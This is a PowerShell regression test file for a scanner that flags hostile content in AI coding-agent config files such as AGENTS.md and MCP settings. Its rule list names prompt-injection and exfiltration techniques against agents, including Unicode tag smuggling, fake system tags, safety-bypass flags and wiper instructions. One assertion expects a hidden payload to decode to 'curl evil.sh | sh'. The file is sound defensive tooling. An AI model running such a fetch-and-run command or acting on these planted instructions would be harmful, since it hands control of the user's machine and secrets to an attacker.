#requires -Version 5.1
# Regression tests for Scan-AgentsMd.ps1. Run: pwsh -NoProfile -File tests/Test-Scanner.ps1
$ErrorActionPreference = 'Stop'
$root = Split-Path $PSScriptRoot -Parent
. (Join-Path $root 'Scan-AgentsMd.ps1')

$config = Get-ScannerConfig
$fail = 0
function Assert([bool]$Cond, [string]$Msg) {
    if ($Cond) { Write-Host "  PASS  $Msg" -ForegroundColor Green }
    else { Write-Host "  FAIL  $Msg" -ForegroundColor Red; $script:fail++ }
}
function Scan([string]$File) {
    @(Invoke-AgentFileScan -File $File -Text ([IO.File]::ReadAllText($File)) -Config $config)
}

# Hostile fixtures are stored as *.inert with dot-* folders so agents never load them; restore the
# real names in a scratch directory outside the repository (mirrors tools/fixtures.py).
$scratch = Join-Path ([IO.Path]::GetTempPath()) ("skillvenom-fixtures-" + [guid]::NewGuid())
foreach ($dir in 'tests/repo', 'samples', 'poc/Downloads') {
    $base = (Resolve-Path (Join-Path $root $dir)).Path
    foreach ($file in Get-ChildItem -LiteralPath $base -Recurse -File -Filter '*.inert') {
        $rel = $file.FullName.Substring($base.Length + 1) -replace '\\', '/'
        $real = (($rel -split '/') | ForEach-Object { $_ -replace '^dot-', '.' }) -join '/'
        $target = Join-Path (Join-Path $scratch $dir) ($real -replace '\.inert$', '')
        New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null
        Copy-Item -LiteralPath $file.FullName -Destination $target
    }
}
$fixtures = Join-Path $scratch 'tests'

Write-Host "`n[0] Hostile fixtures are stored under inert names"
$active = @(Get-ChildItem -LiteralPath (Join-Path $root 'tests/repo'), (Join-Path $root 'samples'), (Join-Path $root 'poc/Downloads') -Recurse -File -Force | Where-Object { $_.Name -notlike '*.inert' -or $_.FullName -match '[\\/]\.' })
Assert ($active.Count -eq 0) "no fixture at an agent-loaded name (got: $($active.Name -join ', '))"

Write-Host "`n[1] Discovery of auto-loaded config files"
$targets = @(Get-ScanTarget -Paths (Join-Path $fixtures 'repo') -Config $config) -replace '\\', '/'
foreach ($p in '/AGENTS.md', '/.claude/settings.json', '/.codex/config.toml', '/.vscode/settings.json',
    '/.vscode/tasks.json', '/.cursor/mcp.json', '/.gemini/settings.json') {
    Assert ([bool]($targets | Where-Object { $_.EndsWith($p) })) "discovers $p"
}
Assert (-not ($targets | Where-Object { $_ -match '/\.github/workflows/' })) 'workflows excluded by default'
$withWf = @(Get-ScanTarget -Paths (Join-Path $fixtures 'repo') -Config $config -IncludeWorkflows) -replace '\\', '/'
Assert ([bool]($withWf | Where-Object { $_ -match '/\.github/workflows/' })) 'workflows included with -IncludeWorkflows'

$expect = [ordered]@{
    'repo/AGENTS.md'                               = 'UNICODE-TAG-SMUGGLING', 'VARIATION-SELECTOR-SMUGGLING', 'FAKE-SYSTEM-TAG',
    'AI-CLI-SAFETY-BYPASS', 'GH-CLI-EXFIL', 'DNS-EXFIL', 'ANSI-ESCAPE-EXFIL', 'MARKDOWN-IMAGE-EXFIL', 'CLOUD-METADATA',
    'WORM-PROPAGATION', 'CI-WORKFLOW-WRITE', 'WIPER-INSTRUCTION', 'AUTHORITATIVE-INSTALL', 'CI-SECRET-LEAK', 'EXEC-HIJACK',
    'WALLET-BROWSER-THEFT', 'KNOWN-IOC'
    'repo/.claude/settings.json'                   = 'CLAUDE-HOOKS', 'CLAUDE-APIKEYHELPER', 'PERMISSION-WILDCARD', 'TRAFFIC-REDIRECT', 'PIPE-TO-SHELL'
    'repo/.codex/config.toml'                      = , 'CODEX-FULL-ACCESS'
    'repo/.vscode/settings.json'                   = , 'VSCODE-AUTOAPPROVE'
    'repo/.vscode/tasks.json'                      = , 'VSCODE-TASK-AUTORUN'
    'repo/.cursor/mcp.json'                        = 'MCP-CONFIG', 'NPX-YES'
    'repo/.gemini/settings.json'                   = , 'GEMINI-TRUST-OFF'
    'repo/.github/workflows/shai-hulud-workflow.yml' = 'KNOWN-IOC', 'CI-WORKFLOW-WRITE', 'TUNNEL-OAST'
}
Write-Host "`n[2] Detection of research-derived techniques"
foreach ($kv in $expect.GetEnumerator()) {
    $rules = (Scan (Join-Path $fixtures $kv.Key)).rule
    foreach ($r in $kv.Value) { Assert ($rules -contains $r) "$($kv.Key) -> $r" }
}

Write-Host "`n[3] Hidden payload decoding and source references"
$f = Scan (Join-Path $fixtures 'repo/AGENTS.md')
$tag = $f | Where-Object rule -eq 'UNICODE-TAG-SMUGGLING' | Select-Object -First 1
Assert ($tag.snippet -eq 'decoded: curl evil.sh | sh') "tag smuggling decoded: '$($tag.snippet)'"
Assert ([bool]($f | Where-Object { $_.rule -eq 'DNS-EXFIL' -and $_.ref -eq '55,56' })) 'findings carry SOURCES.md references'
Assert ([bool]($f | Where-Object { $_.rule -eq 'KNOWN-IOC' -and $_.message -match 's1ngularity' })) 'IOC message names the incident'

Write-Host "`n[4] False positives on a benign instruction file"
$benign = Scan (Join-Path $PSScriptRoot 'benign/AGENTS.md')
$serious = @($benign | Where-Object { $script:Severity[$_.severity] -ge 3 })
Assert ($serious.Count -eq 0) "no HIGH/CRITICAL on benign file (got: $(($serious.rule) -join ', '))"
Assert (-not ($benign.rule -contains 'VARIATION-SELECTOR-SMUGGLING')) 'single emoji variation selector not flagged'
$ngc = 'echo "<NGC_API_KEY>" | docker login nvcr.io --username ''$oauthtoken'' --password-stdin'
$ngcFindings = @(Invoke-AgentFileScan -File 'SKILL.md' -Text $ngc -Config $config)
Assert ($ngcFindings.Count -eq 0) 'NGC placeholder and literal registry username are not credentials'
$tokenFindings = @(Invoke-AgentFileScan -File 'SKILL.md' -Text ($ngc.Replace('<NGC_API_KEY>', '$GITHUB_TOKEN')) -Config $config)
Assert ($tokenFindings.rule -contains 'OAUTH-TOKEN') 'other token references beside literal registry usernames remain detected'

Write-Host "`n[5] JSON output and parity with scan_agents_md.py"
$paths = @(('samples', 'poc/Downloads', 'tests/repo' | ForEach-Object { Join-Path $scratch $_ }) + (Join-Path $root 'tests/benign'))
$psJson = & pwsh -NoProfile -Command "& '$root/Scan-AgentsMd.ps1' -Path '$($paths -join "','")' -IncludeWorkflows -Json" | Out-String
Assert ($psJson.TrimStart().StartsWith('{')) '-Json writes a JSON document to stdout'
$python = Get-Command python3, python -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $python) { Write-Host '  SKIP  python not found' -ForegroundColor Yellow }
else {
    $pyJson = & $python.Source (Join-Path $root 'scan_agents_md.py') --json --include-workflows @paths | Out-String
    $key = { param($j) ($j.PSObject.Properties | ForEach-Object { $f = $_.Name; $_.Value | ForEach-Object { "$f|$($_.line)|$($_.rule)|$($_.severity)|$($_.ref)" } }) | Sort-Object }
    $a = & $key ($psJson | ConvertFrom-Json); $b = & $key ($pyJson | ConvertFrom-Json)
    $diff = @(Compare-Object $a $b)
    Assert ($a.Count -gt 0 -and $diff.Count -eq 0) "PowerShell and Python report identical findings ($($a.Count) vs $($b.Count), $($diff.Count) differences)"
}

Remove-Item -LiteralPath $scratch -Recurse -Force
Write-Host ("`n{0}" -f $(if ($fail) { "$fail test(s) failed" } else { 'All tests passed' })) -ForegroundColor $(if ($fail) { 'Red' } else { 'Green' })
exit [int]($fail -gt 0)
